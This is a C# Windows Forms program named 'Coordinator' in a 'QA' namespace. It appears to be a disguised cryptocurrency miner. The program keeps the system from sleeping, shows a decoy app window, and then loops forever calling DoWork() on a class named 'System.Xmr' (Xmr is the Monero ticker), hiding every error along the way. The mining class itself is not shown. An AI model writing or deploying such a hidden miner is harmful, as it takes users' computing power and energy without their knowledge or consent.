using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace QA
{
  public class Coordinator : Form
  {
    public enum EXECUTION_STATE : uint 
    {
      ES_AWAYMODE_REQUIRED = 0x00000040,
      ES_CONTINUOUS = 0x80000000,
      ES_DISPLAY_REQUIRED = 0x00000002,
      ES_SYSTEM_REQUIRED = 0x00000001
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

    public static void Main(string[] args)
    {
      SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_SYSTEM_REQUIRED);    
      if (Process.GetProcessesByName("CoOrdinator").Length == 1) 
      {
        System.Xmr xmr = new System.Xmr();
        App app = App.Instance;
        App.Show();
        do
        {
          Thread.Sleep(5000);
          try {
            xmr.DoWork();
          }
          catch (System.Exception) {
          }
        } while (true);
      }
      else
      {
          App.Show();
          System.Environment.Exit(0);
      }
    }
  }
}